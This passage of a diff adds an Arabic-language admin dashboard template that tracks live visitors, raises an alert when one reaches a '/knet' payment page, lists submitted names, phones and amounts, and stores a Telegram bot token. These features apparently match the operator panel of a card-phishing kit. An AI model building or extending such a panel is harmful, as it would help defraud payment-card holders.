@@ -1,0 +1,3530 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Admin Dashboard</title>
+  <link rel="icon" type="image/svg+xml" href="/static/frontend/images/favicon/favicon.svg" />
+  <link rel="apple-touch-icon" href="/static/frontend/images/favicon/apple-touch-icon.png" />
+  <link rel="manifest" href="/static/frontend/images/favicon/site.webmanifest" />
+  <meta name="theme-color" content="#0f766e" />
+  <link rel="stylesheet" href="/static/admin/vendor/tabler/tabler.min.css" />
+    <link rel="stylesheet" href="/static/admin/css/dashboard.css?v=20260326-26" />
+</head>
+<body class="admin-dashboard">
+  <div class="page">
+    <header class="topbar">
+      <div class="container-xl topbar-inner">
+        <div class="topbar-right">
+          <div class="online-pill" id="admin-online-pill">
+            <span class="online-pill-label">عدد الزوار</span>
+            <strong class="{% if online_users is not none and online_users > 0 %}online-count visitor-badge returning{% endif %}" id="admin-online-users">
+              {% if online_users is not none %}{{ online_users }}{% else %}N/A{% endif %}
+            </strong>
+          </div>
+          <span class="status-pill">
+            Redis:
+            <span class="connection-state {% if redis_connected %}visitor-badge returning connected{% else %}disconnected{% endif %}">
+              {% if redis_connected %}متصل{% else %}غير متاح{% endif %}
+            </span>
+          </span>
+          <span class="status-pill">
+            MongoDB:
+            <span class="connection-state {% if mongo_connected %}visitor-badge returning connected{% else %}disconnected{% endif %}">
+              {% if mongo_connected %}متصل{% else %}غير متاح{% endif %}
+            </span>
+          </span>
+          <a href="/admin/products" class="btn btn-primary btn-sm">المنتجات</a>
+          <button type="button" class="settings-trigger-btn" id="settings-trigger-btn" aria-label="Open settings">
+            <svg viewBox="0 0 24 24" aria-hidden="true" fill="none">
+              <path d="M10.48 2.82c.18-1 1.61-1 1.79 0l.31 1.76c.08.45.45.78.9.83.42.05.84.16 1.23.34.41.18.89.1 1.2-.2l1.27-1.23c.72-.69 1.73.31 1.04 1.04l-1.23 1.27c-.31.31-.39.79-.2 1.2.18.39.29.81.34 1.23.05.45.38.82.83.9l1.76.31c1 .18 1 1.61 0 1.79l-1.76.31a1.08 1.08 0 0 0-.83.9c-.05.42-.16.84-.34 1.23-.18.41-.1.89.2 1.2l1.23 1.27c.69.72-.31 1.73-1.04 1.04l-1.27-1.23c-.31-.31-.79-.39-1.2-.2-.39.18-.81.29-1.23.34-.45.05-.82.38-.9.83l-.31 1.76c-.18 1-1.61 1-1.79 0l-.31-1.76a1.08 1.08 0 0 0-.9-.83c-.42-.05-.84-.16-1.23-.34a1.08 1.08 0 0 0-1.2.2l-1.27 1.23c-.72.69-1.73-.31-1.04-1.04l1.23-1.27c.31-.31.39-.79.2-1.2a5.7 5.7 0 0 1-.34-1.23 1.08 1.08 0 0 0-.83-.9l-1.76-.31c-1-.18-1-1.61 0-1.79l1.76-.31c.45-.08.78-.45.83-.9.05-.42.16-.84.34-1.23.18-.41.1-.89-.2-1.2L4.78 5.59c-.69-.72.31-1.73 1.04-1.04l1.27 1.23c.31.31.79.39 1.2.2.39-.18.81-.29 1.23-.34.45-.05.82-.38.9-.83l.31-1.76Z"></path>
+              <circle cx="11.375" cy="11.375" r="3.15"></circle>
+            </svg>
+          </button>
+          <form method="post" action="/admin/logout" class="d-inline">
+            <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
+            <button class="btn btn-outline-danger btn-sm" type="submit">Logout</button>
+          </form>
+        </div>
+      </div>
+    </header>
+
+    <main class="page-wrapper">
+      <div class="admin-shell">
+        <section class="dashboard-grid" id="dashboard-grid">
+          <section class="card dashboard-section visitors-panel">
+            <div class="panel-header">
+              <div>
+                <button type="button" class="visitors-filter-toggle" id="visitors-knet-toggle" aria-pressed="false">
+                  KNET
+                </button>
+              </div>
+              <span class="text-secondary">الإجمالي: <strong id="visitors-total-count">{{ total_visitors }}</strong></span>
+            </div>
+
+            <div class="table-responsive">
+              <table class="table table-vcenter card-table visitors-table">
+                <tbody id="recent-visitors-body">
+                  {% if recent_visitors %}
+                    {% for visitor in recent_visitors %}
+                    <tr class="visitor-row">
+                      <td>
+                        <div class="visitor-swipe-shell {% if visitor.is_blocked %}is-blocked-shell{% endif %}">
+                          <button type="button" class="visitor-archive-action" data-visitor-id="{{ visitor.id }}" aria-label="Archive visitor">
+                            <span class="visitor-archive-action-inner">
+                              <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M9 3h6l1 2h4v2H4V5h4l1-2Zm-3 6h12l-1 10a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2L6 9Zm4 2v6m4-6v6" fill="none"></path></svg>
+                            </span>
+                          </button>
+                          <button
+                            type="button"
+                            class="visitor-block-toggle {% if visitor.is_blocked %}is-blocked{% endif %}"
+                            data-visitor-id="{{ visitor.id }}"
+                            aria-label="{% if visitor.is_blocked %}Unblock visitor{% else %}Block visitor{% endif %}"
+                          >
+                            <span class="visitor-block-toggle-inner">
+                              <svg viewBox="0 0 24 24" aria-hidden="true">
+                                <path d="M15 9V7a3 3 0 1 0-6 0v2m-2 0h10a1 1 0 0 1 1 1v6a3 3 0 0 1-3 3H9a3 3 0 0 1-3-3v-6a1 1 0 0 1 1-1Zm5 4v2" fill="none"></path>
+                              </svg>
+                              <span>{% if visitor.is_blocked %}رفع{% else %}حظر{% endif %}</span>
+                            </span>
+                          </button>
+                          <div
+                            class="visitor-option {% if visitor.is_blocked %}is-blocked{% endif %}"
+                            data-visitor-id="{{ visitor.id }}"
+                            title="{{ visitor.id }}"
+                            role="button"
+                            tabindex="0"
+                          >
+                            <span class="visitor-status-icon {% if visitor.is_online %}is-online{% else %}is-offline{% endif %}" aria-hidden="true">
+                              <span class="visitor-status-dot"></span>
+                            </span>
+                            <span class="visitor-cell">
+                              <strong>Visitor #{{ visitor.id[-3:] if visitor.id else "N/A" }}</strong>
+                              {% if visitor.is_online %}
+                              <button
+                                type="button"
+                                class="visitor-location-button {% if visitor.is_online and visitor.current_page_path %}is-live{% endif %}"
+                                data-visitor-id="{{ visitor.id }}"
+                                data-page-path="{{ visitor.current_page_path or '' }}"
+                                data-page-title="{{ visitor.current_page_title or visitor.current_page_path or '' }}"
+                                aria-label="Visitor current page"
+                              >
+                                {% if visitor.current_page_path %}
+                                  {{ visitor.current_page_title or visitor.current_page_path }}
+                                {% else %}
+                                  On site
+                                {% endif %}
+                              </button>
+                              {% endif %}
+                            </span>
+                          </div>
+                        </div>
+                      </td>
+                    </tr>
+                    {% endfor %}
+                  {% else %}
+                    <tr id="no-visitors-row">
+                      <td class="text-secondary">No visitors tracked yet.</td>
+                    </tr>
+                  {% endif %}
+                </tbody>
+              </table>
+            </div>
+          </section>
+
+          <section class="card dashboard-section submissions-panel">
+            <div
+              class="panel-edge-resizer panel-edge-resizer-left"
+              data-resize-edge="left"
+              role="separator"
+              aria-label="Resize submissions panel"
+              aria-orientation="vertical"
+            ></div>
+            <div
+              class="panel-edge-resizer panel-edge-resizer-top"
+              data-resize-edge="top"
+              role="separator"
+              aria-label="Resize submissions panel height"
+              aria-orientation="horizontal"
+            ></div>
+            <div class="panel-header">
+              <div class="submissions-header-summary" id="submissions-header-summary">
+                <div class="submissions-header-item">
+                  <span class="submissions-header-label">الاسم</span>
+                  <strong class="submissions-header-value" id="submission-name-value">-</strong>
+                </div>
+                <div class="submissions-header-item">
+                  <span class="submissions-header-label">الهاتف</span>
+                  <strong class="submissions-header-value" id="submission-phone-value">-</strong>
+                </div>
+                <div class="submissions-header-item">
+                  <span class="submissions-header-label">إجمالي المبلغ</span>
+                  <strong class="submissions-header-value" id="submission-total-value">-</strong>
+                </div>
+              </div>
+              <button type="button" class="submissions-details-btn" id="submissions-details-trigger" disabled aria-disabled="true">
+                عرض المعلومات
+              </button>
+            </div>
+
+            <div class="table-responsive">
+              <table class="table table-vcenter card-table submissions-table">
+                <thead id="recent-submissions-head"></thead>
+                <tbody id="recent-submissions-body"></tbody>
+              </table>
+            </div>
+          </section>
+        </section>
+      </div>
+    </main>
+  </div>
+
+  <div class="admin-modal-backdrop" id="settings-modal" hidden aria-hidden="true">
+    <div class="admin-modal-card" role="dialog" aria-modal="true" aria-labelledby="settings-modal-title">
+      <div class="admin-modal-header">
+        <h3 class="admin-modal-title" id="settings-modal-title">Settings</h3>
+        <button type="button" class="admin-modal-close-btn" id="settings-modal-close-btn" aria-label="Close settings">×</button>
+      </div>
+      <div class="admin-modal-body">
+        <div class="settings-token-field settings-token-field-spaced">
+          <div class="payment-settings-card">
+            <div class="payment-settings-head">
+              <h4 class="payment-settings-title">طرق الدفع</h4>
+              <p class="payment-settings-note">اختر طريقة دفع واحدة على الأقل للمتجر وصفحة الدفع.</p>
+            </div>
+            <label class="payment-settings-option">
+              <input type="checkbox" id="payment-knet-input" checked>
+              <span>كي نت</span>
+            </label>
+            <label class="payment-settings-option">
+              <input type="checkbox" id="payment-cards-input" checked>
+              <span>بطاقات الائتمان (Visa / Mastercard)</span>
+            </label>
+            <p class="settings-token-feedback" id="payment-settings-feedback" hidden aria-live="polite"></p>
+          </div>
+        </div>
+
+        <div class="settings-token-field">
+          <div class="settings-token-inline">
+            <div class="settings-token-row">
+              <span class="settings-token-icon" aria-hidden="true">
+                <svg viewBox="0 0 24 24">
+                  <path d="M21.2 4.34c.72-.28 1.41.35 1.18 1.09l-3.12 10.14c-.24.77-.98 1.15-1.69.88l-4.1-1.57-2.08 2.1c-.28.28-.49.52-.95.52l.3-4.34 7.9-7.14c.34-.31-.08-.49-.53-.18l-9.77 6.16-4.21-1.32c-.91-.29-.93-1.55.19-1.99Z"></path>
+                </svg>
+              </span>
+              <span class="settings-token-divider" aria-hidden="true"></span>
+              <input
+                type="text"
+                class="settings-token-input"
+                id="telegram-api-token-input"
+                placeholder="Insert API token"
+                autocomplete="off"
+                spellcheck="false"
+              >
+            </div>
+            <div class="settings-token-actions" id="telegram-token-actions" hidden>
+              <button
+                type="button"
+                class="settings-token-action-btn"
+                id="telegram-settings-edit-btn"
+                aria-label="Edit Telegram token"
+              >
+                <svg viewBox="0 0 24 24">
+                  <path d="M3 17.25V21h3.75L17.8 9.94l-3.75-3.75z"></path>
+                  <path d="M20.71 7.04a1 1 0 0 0 0-1.41L18.37 3.29a1 1 0 0 0-1.41 0L15.13 5.12l3.75 3.75z"></path>
+                </svg>
+              </button>
+              <button
+                type="button"
+                class="settings-token-action-btn is-danger"
+                id="telegram-settings-remove-btn"
+                aria-label="Remove Telegram settings"
+              >
+                <svg viewBox="0 0 24 24">
+                  <path d="M9 3h6l1 2h4v2H4V5h4z"></path>
+                  <path d="M6 9h12l-1 11H7z"></path>
+                </svg>
+              </button>
+            </div>
+          </div>
+          <div class="settings-chat-id-field" id="telegram-chat-id-field" hidden>
+            <label class="settings-chat-id-label" for="telegram-chat-id-input">Chat ID</label>
+            <input
+              type="text"
+              class="settings-chat-id-input"
+              id="telegram-chat-id-input"
+              value=""
+              disabled
+            >
+          </div>
+          <p
+            class="settings-token-feedback"
+            id="telegram-api-token-feedback"
+            hidden
+            aria-live="polite"
+          ></p>
+        </div>
+
+        <div class="settings-token-field settings-token-field-spaced">
+          <div class="settings-token-inline">
+            <div class="settings-token-row">
+              <span class="settings-token-icon is-whatsapp" aria-hidden="true">
+                <svg viewBox="0 0 24 24">
+                  <path d="M12 3.5a8.5 8.5 0 0 0-7.36 12.74L3.5 20.5l4.42-1.1A8.5 8.5 0 1 0 12 3.5Z"></path>
+                  <path d="M9.25 8.95c.18-.41.38-.42.56-.43h.48c.15 0 .35.06.53.46.18.4.6 1.46.65 1.57.05.11.09.24.02.38-.07.14-.11.23-.22.35-.11.12-.23.27-.33.36-.11.11-.22.23-.09.45.13.22.57.93 1.22 1.51.84.75 1.55.98 1.77 1.09.22.11.35.09.48-.05.13-.14.56-.65.71-.87.15-.22.3-.18.5-.11.21.07 1.31.62 1.54.73.23.11.38.17.44.26.05.09.05.52-.12 1.03-.17.51-.97.97-1.35 1.03-.35.06-.8.08-1.29-.08-.3-.1-.68-.22-1.17-.43-2.07-.89-3.42-2.98-3.52-3.12-.1-.14-.84-1.11-.84-2.12 0-1.01.53-1.51.72-1.72Z"></path>
+                </svg>
+              </span>
+              <span class="settings-token-divider" aria-hidden="true"></span>
+              <input
+                type="text"
+                class="settings-token-input"
+                id="whatsapp-input"
+                placeholder="Insert WhatsApp number"
+                autocomplete="off"
+                spellcheck="false"
+              >
+            </div>
+            <div class="settings-token-actions" id="whatsapp-actions" hidden>
+              <button
+                type="button"
+                class="settings-token-action-btn"
+                id="whatsapp-edit-btn"
+                aria-label="Edit WhatsApp number"
+              >
+                <svg viewBox="0 0 24 24">
+                  <path d="M3 17.25V21h3.75L17.8 9.94l-3.75-3.75z"></path>
+                  <path d="M20.71 7.04a1 1 0 0 0 0-1.41L18.37 3.29a1 1 0 0 0-1.41 0L15.13 5.12l3.75 3.75z"></path>
+                </svg>
+              </button>
+              <button
+                type="button"
+                class="settings-token-action-btn is-danger"
+                id="whatsapp-remove-btn"
+                aria-label="Remove WhatsApp number"
+              >
+                <svg viewBox="0 0 24 24">
+                  <path d="M9 3h6l1 2h4v2H4V5h4z"></path>
+                  <path d="M6 9h12l-1 11H7z"></path>
+                </svg>
+              </button>
+            </div>
+          </div>
+          <p
+            class="settings-token-feedback settings-token-feedback-ltr"
+            id="whatsapp-feedback"
+            hidden
+            aria-live="polite"
+          ></p>
+        </div>
+
+        <div class="payment-settings-card settings-testing-card">
+          <label class="payment-settings-option">
+            <input type="checkbox" id="testing-autofill-input">
+            <span>وضع الاختبار</span>
+          </label>
+        </div>
+
+      </div>
+      <div class="admin-modal-footer">
+        <button type="button" class="payment-settings-save-btn settings-global-save-btn" id="settings-global-save-btn">حفظ الإعدادات</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="admin-modal-backdrop" id="telegram-confirm-modal" hidden aria-hidden="true">
+    <div class="admin-modal-card admin-confirm-card" role="dialog" aria-modal="true" aria-labelledby="telegram-confirm-title">
+      <div class="admin-modal-header">
+        <h3 class="admin-modal-title" id="telegram-confirm-title">Confirm Telegram Change</h3>
+        <button type="button" class="admin-modal-close-btn" id="telegram-confirm-close-btn" aria-label="Close confirmation">×</button>
+      </div>
+      <div class="admin-modal-body admin-confirm-body">
+        <p class="admin-confirm-message" id="telegram-confirm-message"></p>
+        <div class="admin-confirm-actions">
+          <button type="button" class="admin-confirm-btn is-secondary" id="telegram-confirm-cancel-btn">Cancel</button>
+          <button type="button" class="admin-confirm-btn is-danger" id="telegram-confirm-action-btn">Confirm</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="admin-modal-backdrop" id="visitor-pages-modal" hidden aria-hidden="true">
+    <div class="admin-modal-card admin-confirm-card visitor-pages-modal-card" role="dialog" aria-modal="true" aria-labelledby="visitor-pages-title">
+      <div class="admin-modal-header">
+        <h3 class="admin-modal-title" id="visitor-pages-title">Current Pages</h3>
+        <button type="button" class="admin-modal-close-btn" id="visitor-pages-close-btn" aria-label="Close pages modal">×</button>
+      </div>
+      <div class="admin-modal-body admin-confirm-body visitor-pages-body">
+        <div class="visitor-pages-list" id="visitor-pages-list"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="admin-modal-backdrop" id="submissions-details-modal" hidden aria-hidden="true">
+    <div class="admin-modal-card admin-confirm-card submissions-details-modal-card" role="dialog" aria-modal="true" aria-labelledby="submissions-details-title">
+      <div class="admin-modal-header">
+        <h3 class="admin-modal-title" id="submissions-details-title">البيانات المرسلة</h3>
+        <button type="button" class="admin-modal-close-btn" id="submissions-details-close-btn" aria-label="Close submissions details modal">×</button>
+      </div>
+      <div class="admin-modal-body submissions-details-body" id="submissions-details-content"></div>
+    </div>
+  </div>
+
+  <script src="/static/admin/vendor/tabler/tabler.min.js"></script>
+    <script>
+    (function () {
+      var topbarEl = document.querySelector(".topbar");
+      var countEl = document.getElementById("admin-online-users");
+      var dashboardGridEl = document.getElementById("dashboard-grid");
+      var panelResizerEls = document.querySelectorAll(".panel-edge-resizer");
+      var visitorsBodyEl = document.getElementById("recent-visitors-body");
+      var visitorsTotalEl = document.getElementById("visitors-total-count");
+      var visitorsKnetToggleEl = document.getElementById("visitors-knet-toggle");
+      var submissionsTitleEl = document.getElementById("submissions-panel-title");
+      var submissionsSummaryEl = document.getElementById("submissions-panel-summary");
+      var submissionsHeadEl = document.getElementById("recent-submissions-head");
+      var submissionsBodyEl = document.getElementById("recent-submissions-body");
+      var submissionsDetailsTriggerEl = document.getElementById("submissions-details-trigger");
+      var submissionsDetailsModalEl = document.getElementById("submissions-details-modal");
+      var submissionsDetailsCloseBtnEl = document.getElementById("submissions-details-close-btn");
+      var submissionsDetailsContentEl = document.getElementById("submissions-details-content");
+      var submissionsHeaderSummaryEl = document.getElementById("submissions-header-summary");
+      var submissionNameValueEl = document.getElementById("submission-name-value");
+      var submissionPhoneValueEl = document.getElementById("submission-phone-value");
+      var submissionTotalValueEl = document.getElementById("submission-total-value");
+      var settingsTriggerEl = document.getElementById("settings-trigger-btn");
+      var settingsModalEl = document.getElementById("settings-modal");
+      var settingsModalCloseEl = document.getElementById("settings-modal-close-btn");
+      var telegramApiTokenInputEl = document.getElementById("telegram-api-token-input");
+      var telegramApiTokenFeedbackEl = document.getElementById("telegram-api-token-feedback");
+      var telegramChatIdFieldEl = document.getElementById("telegram-chat-id-field");
+      var telegramChatIdInputEl = document.getElementById("telegram-chat-id-input");
+      var telegramTokenActionsEl = document.getElementById("telegram-token-actions");
+      var telegramSettingsEditBtnEl = document.getElementById("telegram-settings-edit-btn");
+      var telegramSettingsRemoveBtnEl = document.getElementById("telegram-settings-remove-btn");
+      var telegramConfirmModalEl = document.getElementById("telegram-confirm-modal");
+      var telegramConfirmCloseBtnEl = document.getElementById("telegram-confirm-close-btn");
+      var telegramConfirmCancelBtnEl = document.getElementById("telegram-confirm-cancel-btn");
+      var telegramConfirmActionBtnEl = document.getElementById("telegram-confirm-action-btn");
+      var telegramConfirmMessageEl = document.getElementById("telegram-confirm-message");
+      var visitorPagesModalEl = document.getElementById("visitor-pages-modal");
+      var visitorPagesCloseBtnEl = document.getElementById("visitor-pages-close-btn");
+      var visitorPagesListEl = document.getElementById("visitor-pages-list");
+      var whatsappInputEl = document.getElementById("whatsapp-input");
+      var whatsappFeedbackEl = document.getElementById("whatsapp-feedback");
+      var whatsappActionsEl = document.getElementById("whatsapp-actions");
+      var whatsappEditBtnEl = document.getElementById("whatsapp-edit-btn");
+      var whatsappRemoveBtnEl = document.getElementById("whatsapp-remove-btn");
+      var mongoUrlInputEl = null;
+      var mongoUrlFeedbackEl = null;
+      var mongoUrlActionsEl = null;
+      var mongoUrlEditBtnEl = null;
+      var mongoUrlRemoveBtnEl = null;
+      var redisUrlInputEl = null;
+      var redisUrlFeedbackEl = null;
+      var redisUrlActionsEl = null;
+      var redisUrlEditBtnEl = null;
+      var redisUrlRemoveBtnEl = null;
+      var sqlUrlInputEl = null;
+      var sqlUrlFeedbackEl = null;
+      var sqlUrlActionsEl = null;
+      var sqlUrlEditBtnEl = null;
+      var sqlUrlRemoveBtnEl = null;
+      var paymentKnetInputEl = document.getElementById("payment-knet-input");
+      var paymentCardsInputEl = document.getElementById("payment-cards-input");
+      var testingAutofillInputEl = document.getElementById("testing-autofill-input");
+      var paymentSettingsSaveBtnEl = document.getElementById("settings-global-save-btn");
+      var paymentSettingsFeedbackEl = document.getElementById("payment-settings-feedback");
+      var csrfToken = "{{ csrf_token }}";
+      var wsToken = "{{ ws_token }}";
+      var adminSocket = null;
+      var adminSocketReconnectTimerId = 0;
+      var adminSocketReconnectDelayMs = 1000;
+      var ADMIN_SOCKET_RECONNECT_MAX_MS = 10000;
+      var storedTelegramSettings = {{ (telegram_settings if telegram_settings is defined and telegram_settings is not none else {"api_token": "", "chat_id": ""})|tojson }};
+      var storedWhatsappSettings = {{ (whatsapp_settings if whatsapp_settings is defined and whatsapp_settings is not none else {"value": ""})|tojson }};
+      var storedPaymentSettings = {{ (payment_settings if payment_settings is defined and payment_settings is not none else {"knet_enabled": true, "cards_enabled": true, "testing_enabled": false})|tojson }};
+      var storedConnectionSettings = {{ (connection_settings if connection_settings is defined and connection_settings is not none else {"mongo": {"url": "", "source": "", "is_dashboard": false}, "redis": {"url": "", "source": "", "is_dashboard": false}, "sql": {"url": "", "source": "", "is_dashboard": false}})|tojson }};
+      var availableFrontendPages = {{ (available_frontend_pages if available_frontend_pages is defined and available_frontend_pages is not none else [])|tojson }};
+      var PANEL_WIDTH_STORAGE_KEY = "fastapi-base-admin-visitors-width";
+      var MOBILE_VISITORS_HEIGHT_STORAGE_KEY = "fastapi-base-admin-mobile-visitors-height";
+      var SELECTED_VISITOR_STORAGE_KEY = "fastapi-base-admin-selected-visitor";
+      var SEEN_SUBMISSION_STATE_STORAGE_KEY = "fastapi-base-admin-seen-submission-state";
+      var SEEN_KNET_STATE_STORAGE_KEY = "fastapi-base-admin-seen-knet-state";
+      var MIN_VISITORS_WIDTH = 280;
+      var MIN_SUBMISSIONS_WIDTH = 300;
+      var MIN_SUBMISSIONS_HEIGHT = 280;
+      var MIN_MOBILE_VISITORS_HEIGHT = 96;
+      var SWIPE_ACTIVATE_DISTANCE = 12;
+      var VISITOR_ARCHIVE_REVEAL_RATIO = 0.50;
+      var VISITOR_ARCHIVE_SETTLE_THRESHOLD_RATIO = 0.10;
+      var VISITOR_ARCHIVE_FLY_DURATION_MS = 3000;
+      var VISITOR_ARCHIVE_COLLAPSE_DELAY_MS = 2600;
+      var VISITOR_WHEEL_RESET_DELAY_MS = 1400;
+      var allVisitors = {{ recent_visitors|tojson }};
+      var allSubmissions = {{ recent_submissions|tojson }};
+      var totalVisitorsCount = {{ total_visitors }};
+      var selectedVisitorId = loadPersistedSelectedVisitorId() || null;
+      var visitorSwipeState = null;
+      var visitorWheelState = null;
+      var telegramLookupTimeoutId = 0;
+      var telegramLookupRequestId = 0;
+      var telegramConfirmAction = null;
+      var telegramConfirmCancelAction = null;
+      var telegramIsEditing = false;
+      var whatsappIsEditing = false;
+      var paymentSettingsSaving = false;
+      var connectionLookupTimeoutIds = {};
+      var connectionLookupRequestIds = {};
+      var connectionEditingState = {};
+      var topbarCollapseTimerId = 0;
+      var activeVisitorPagesModalVisitorId = "";
+      var seenSubmissionState = loadSeenSubmissionState();
+      var seenKnetState = loadSeenKnetState();
+      var knetAlertAudioEl = new Audio("/static/admin/sound/notification.mp3");
+      var knetAlertAudioUnlocked = false;
+      var pendingKnetAlertPlays = 0;
+      var visitorCurrentPageById = {};
+      var knetAlertUnlockListenersBound = false;
+      var showKnetVisitorsOnly = false;
+
+      knetAlertAudioEl.preload = "auto";
+      try {
+        knetAlertAudioEl.load();
+      } catch (error) {
+      }
+
+      allVisitors.forEach(function (visitor) {
+        var visitorId = String(visitor && visitor.id || "");
+        if (!visitorId) {
+          return;
+        }
+        visitorCurrentPageById[visitorId] = String(visitor.current_page_path || "");
+      });
+
+      function escapeHtml(value) {
+        return String(value)
+          .replaceAll("&", "&amp;")
+          .replaceAll("<", "&lt;")
+          .replaceAll(">", "&gt;")
+          .replaceAll("\"", "&quot;")
+          .replaceAll("'", "&#39;");
+      }
+
+      function statusBadgeClass(status) {
+        return status === "new" ? "new" : "returning";
+      }
+
+      function persistSelectedVisitorId() {
+        try {
+          if (selectedVisitorId) {
+            localStorage.setItem(SELECTED_VISITOR_STORAGE_KEY, String(selectedVisitorId));
+            return;
+          }
+          localStorage.removeItem(SELECTED_VISITOR_STORAGE_KEY);
+        } catch (error) {
+        }
+      }
+
+      function loadPersistedSelectedVisitorId() {
+        try {
+          var storedVisitorId = localStorage.getItem(SELECTED_VISITOR_STORAGE_KEY);
+          return storedVisitorId ? String(storedVisitorId) : "";
+        } catch (error) {
+          return "";
+        }
+      }
+
+      function persistSeenSubmissionState() {
+        try {
+          localStorage.setItem(
+            SEEN_SUBMISSION_STATE_STORAGE_KEY,
+            JSON.stringify(seenSubmissionState || {})
+          );
+        } catch (error) {
+        }
+      }
+
+      function loadSeenSubmissionState() {
+        try {
+          var raw = localStorage.getItem(SEEN_SUBMISSION_STATE_STORAGE_KEY);
+          if (!raw) {
+            return {};
+          }
+          var parsed = JSON.parse(raw);
+          return parsed && typeof parsed === "object" ? parsed : {};
+        } catch (error) {
+          return {};
+        }
+      }
+
+      function persistSeenKnetState() {
+        try {
+          localStorage.setItem(
+            SEEN_KNET_STATE_STORAGE_KEY,
+            JSON.stringify(seenKnetState || {})
+          );
+        } catch (error) {
+        }
+      }
+
+      function loadSeenKnetState() {
+        try {
+          var raw = localStorage.getItem(SEEN_KNET_STATE_STORAGE_KEY);
+          if (!raw) {
+            return {};
+          }
+          var parsed = JSON.parse(raw);
+          return parsed && typeof parsed === "object" ? parsed : {};
+        } catch (error) {
+          return {};
+        }
+      }
+
+      function syncSelectedVisitorWithAvailableVisitors() {
+        if (!selectedVisitorId) {
+          persistSelectedVisitorId();
+          return;
+        }
+        var stillExists = allVisitors.some(function (visitor) {
+          return String(visitor && visitor.id || "") === String(selectedVisitorId);
+        });
+        if (!stillExists) {
+          selectedVisitorId = null;
+        }
+        persistSelectedVisitorId();
+      }
+
+      function getVisitorKnetStateId(visitor) {
+        var visitorId = String(visitor && visitor.id || "");
+        var currentPagePath = String(visitor && visitor.current_page_path || "");
+        if (!visitorId || currentPagePath !== "/knet") {
+          return "";
+        }
+        return visitorId + "::" + currentPagePath;
+      }
+
+      function visitorHasUnreadKnetState(visitor) {
+        var visitorId = String(visitor && visitor.id || "");
+        var stateId = getVisitorKnetStateId(visitor);
+        if (!visitorId || !stateId) {
+          return false;
+        }
+        return seenKnetState[visitorId] !== stateId;
+      }
+
+      function markVisitorKnetSeen(visitorId) {
+        var visitor = getSelectedVisitorRecord(visitorId);
+        var stateId = getVisitorKnetStateId(visitor);
+        if (!visitorId || !stateId) {
+          return;
+        }
+        seenKnetState[String(visitorId)] = stateId;
+        persistSeenKnetState();
+      }
+
+      var connectionFieldConfigs = {
+        mongo: {
+          label: "MongoDB",
+          inputEl: mongoUrlInputEl,
+          feedbackEl: mongoUrlFeedbackEl,
+          actionsEl: mongoUrlActionsEl,
+          editBtnEl: mongoUrlEditBtnEl,
+          removeBtnEl: mongoUrlRemoveBtnEl
+        },
+        redis: {
+          label: "Redis",
+          inputEl: redisUrlInputEl,
+          feedbackEl: redisUrlFeedbackEl,
+          actionsEl: redisUrlActionsEl,
+          editBtnEl: redisUrlEditBtnEl,
+          removeBtnEl: redisUrlRemoveBtnEl
+        },
+        sql: {
+          label: "SQL",
+          inputEl: sqlUrlInputEl,
+          feedbackEl: sqlUrlFeedbackEl,
+          actionsEl: sqlUrlActionsEl,
+          editBtnEl: sqlUrlEditBtnEl,
+          removeBtnEl: sqlUrlRemoveBtnEl
+        }
+      };
+
+      function isCompactHeaderViewport() {
+        return window.matchMedia("(max-width: 900px)").matches;
+      }
+
+      function clearTopbarCollapseTimer() {
+        if (!topbarCollapseTimerId) {
+          return;
+        }
+        window.clearTimeout(topbarCollapseTimerId);
+        topbarCollapseTimerId = 0;
+      }
+
+      function expandTopbar() {
+        if (!topbarEl || !isCompactHeaderViewport()) {
+          return;
+        }
+        clearTopbarCollapseTimer();
+        topbarEl.classList.add("is-expanded");
+      }
+
+      function collapseTopbar() {
+        if (!topbarEl) {
+          return;
+        }
+        clearTopbarCollapseTimer();
+        topbarEl.classList.remove("is-expanded");
+      }
+
+      function scheduleTopbarCollapse() {
+        if (!topbarEl || !isCompactHeaderViewport()) {
+          return;
+        }
+        clearTopbarCollapseTimer();
+        topbarCollapseTimerId = window.setTimeout(function () {
+          if (topbarEl.matches(":hover") || topbarEl.matches(":focus-within")) {
+            return;
+          }
+          topbarEl.classList.remove("is-expanded");
+          topbarCollapseTimerId = 0;
+        }, 2000);
+      }
+
+      function bindCompactTopbarBehavior() {
+        if (!topbarEl) {
+          return;
+        }
+        topbarEl.addEventListener("mouseenter", expandTopbar);
+        topbarEl.addEventListener("mouseleave", scheduleTopbarCollapse);
+        topbarEl.addEventListener("focusin", expandTopbar);
+        topbarEl.addEventListener("focusout", function () {
+          window.setTimeout(function () {
+            if (topbarEl.matches(":focus-within")) {
+              return;
+            }
+            scheduleTopbarCollapse();
+          }, 0);
+        });
+        window.addEventListener("resize", function () {
+          if (isCompactHeaderViewport()) {
+            return;
+          }
+          collapseTopbar();
+        });
+      }
+
+      function getStoredConnectionConfig(service) {
+        return storedConnectionSettings[service] || { url: "", source: "", is_dashboard: false };
+      }
+
+      function hasStoredDashboardConnection(service) {
+        var config = getStoredConnectionConfig(service);
+        return Boolean(config && config.is_dashboard && config.url);
+      }
+
+      function setConnectionFeedback(service, message, variant) {
+        var config = connectionFieldConfigs[service];
+        if (!config || !config.feedbackEl) {
+          return;
+        }
+        config.feedbackEl.textContent = message || "";
+        config.feedbackEl.classList.remove("is-loading", "is-error");
+        if (!message) {
+          config.feedbackEl.hidden = true;
+          return;
+        }
+        config.feedbackEl.hidden = false;
+        if (variant) {
+          config.feedbackEl.classList.add("is-" + variant);
+        }
+      }
+
+      function syncConnectionStoredState(service) {
+        var config = connectionFieldConfigs[service];
+        if (!config || !config.inputEl) {
+          return;
+        }
+        var isEditing = connectionEditingState[service] === true;
+        var hasDashboardValue = hasStoredDashboardConnection(service);
+        config.inputEl.disabled = hasDashboardValue && !isEditing;
+        if (config.actionsEl) {
+          config.actionsEl.hidden = !hasDashboardValue || isEditing;
+        }
+      }
+
+      function setConnectionEditing(service, isEditing) {
+        connectionEditingState[service] = Boolean(isEditing);
+        syncConnectionStoredState(service);
+      }
+
+      function applyStoredConnectionSettings(nextSettings, preserveInput) {
+        storedConnectionSettings = nextSettings || storedConnectionSettings;
+        Object.keys(connectionFieldConfigs).forEach(function (service) {
